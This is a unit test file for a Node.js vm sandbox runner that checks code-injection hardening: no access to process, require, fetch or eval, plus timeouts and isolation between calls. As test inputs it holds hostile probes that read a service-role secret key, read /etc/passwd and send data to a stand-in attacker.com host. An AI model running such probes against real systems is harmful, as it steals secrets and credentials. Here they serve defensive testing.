/**
 * Unit tests for vm-runner — WKH-60 / SEC-RCE-1 W0 (post-AR hardened)
 *
 * 11 tests:
 *  - T-VM-1  happy path: simple return body
 *  - T-VM-2  output is bound correctly inside sandbox
 *  - T-VM-3  process is undefined (RCE bypass blocked)
 *  - T-VM-4  require is undefined
 *  - T-VM-5  fetch is undefined
 *  - T-VM-6  eval is blocked (codeGeneration.strings=false)
 *  - T-VM-7  new Function is blocked
 *  - T-VM-8  infinite loop hits TransformTimeoutError
 *  - T-VM-9  syntax error wraps as TransformExecutionError
 *  - T-VM-10 invalid timeoutMs throws TransformExecutionError (input guard)
 *  - T-VM-11 each call gets a fresh context (no cross-call state)
 *
 * Post-AR refactor: executeTransformInVm now returns Promise<unknown> because
 * it spawns a worker_threads Worker. All tests use async/await + rejects.
 */
import { describe, expect, it } from 'vitest';
import {
  executeTransformInVm,
  TransformExecutionError,
  TransformTimeoutError,
} from './vm-runner.js';

describe('vm-runner — executeTransformInVm', () => {
  // T-VM-1
  it('T-VM-1: returns the value produced by a simple transform body', async () => {
    const result = await executeTransformInVm(
      'return { query: output.text };',
      { text: 'hello' },
      1000,
    );
    expect(result).toEqual({ query: 'hello' });
  });

  // T-VM-2
  it('T-VM-2: output is bound and readable inside the sandbox', async () => {
    const result = await executeTransformInVm(
      'return output.a + output.b;',
      { a: 2, b: 3 },
      1000,
    );
    expect(result).toBe(5);
  });

  // T-VM-3 — Process bypass throws (key RCE attack vector)
  it('T-VM-3: typeof process === "undefined" inside the sandbox (no RCE)', async () => {
    await expect(
      executeTransformInVm(
        'return process.env.SUPABASE_SERVICE_ROLE_KEY;',
        {},
        1000,
      ),
    ).rejects.toThrow(TransformExecutionError);
  });

  // T-VM-4 — Require bypass throws
  it('T-VM-4: require is undefined inside the sandbox', async () => {
    await expect(
      executeTransformInVm(
        'return require("node:fs").readFileSync("/etc/passwd", "utf8");',
        {},
        1000,
      ),
    ).rejects.toThrow(TransformExecutionError);
  });

  // T-VM-5 — Fetch bypass throws
  it('T-VM-5: fetch is undefined inside the sandbox (no SSRF)', async () => {
    await expect(
      executeTransformInVm(
        'return fetch("http://attacker.com/exfil");',
        {},
        1000,
      ),
    ).rejects.toThrow(TransformExecutionError);
  });

  // T-VM-6 — eval blocked (strings: false)
  it('T-VM-6: eval is blocked by codeGeneration.strings = false', async () => {
    await expect(
      executeTransformInVm('return eval("1 + 1");', {}, 1000),
    ).rejects.toThrow(TransformExecutionError);
  });

  // T-VM-7 — new Function blocked (strings: false)
  it('T-VM-7: new Function is blocked by codeGeneration.strings = false', async () => {
    await expect(
      executeTransformInVm('return new Function("return 1")();', {}, 1000),
    ).rejects.toThrow(TransformExecutionError);
  });

  // T-VM-8 — Infinite loop is killed by timeout
  it('T-VM-8: infinite loop raises TransformTimeoutError within budget', async () => {
    await expect(
      executeTransformInVm('while (true) {} return 0;', {}, 50),
    ).rejects.toThrow(TransformTimeoutError);
  });

  // T-VM-9 — Syntax error becomes TransformExecutionError
  it('T-VM-9: a syntax error in the body wraps as TransformExecutionError', async () => {
    await expect(executeTransformInVm('return { ;', {}, 1000)).rejects.toThrow(
      TransformExecutionError,
    );
  });

  // T-VM-10 — Input guard for timeoutMs
  it('T-VM-10: invalid timeoutMs throws TransformExecutionError before running', async () => {
    await expect(executeTransformInVm('return 1;', {}, 0)).rejects.toThrow(
      TransformExecutionError,
    );
    await expect(executeTransformInVm('return 1;', {}, -10)).rejects.toThrow(
      TransformExecutionError,
    );
    await expect(
      executeTransformInVm('return 1;', {}, Number.NaN),
    ).rejects.toThrow(TransformExecutionError);
  });

  // T-VM-11 — No state leaks between calls
  it('T-VM-11: each call gets a fresh sandbox (no cross-call state)', async () => {
    // First call: tries to set a "global" via implicit global assignment.
    // Each invocation spawns a NEW worker with a NEW vm context, so even
    // sloppy-mode implicit globals cannot persist.
    await executeTransformInVm(
      'output.bag = "first"; return 1;',
      { bag: '' },
      1000,
    );

    // Second call: try to read what call 1 may have leaked. `bag` resolves
    // against the (empty) sandbox + (rebound) `output`, so it's `undefined`.
    const result = await executeTransformInVm(
      'return typeof bag;',
      { bag: 'second' },
      1000,
    );
    expect(result).toBe('undefined');
  });
});

describe('vm-runner — TransformTimeoutError shape', () => {
  it('exposes timeoutMs and a clear name', async () => {
    try {
      await executeTransformInVm('while(true){}', {}, 25);
      throw new Error('did not throw');
    } catch (err) {
      expect(err).toBeInstanceOf(TransformTimeoutError);
      expect((err as TransformTimeoutError).name).toBe('TransformTimeoutError');
      expect((err as TransformTimeoutError).timeoutMs).toBe(25);
    }
  });
});
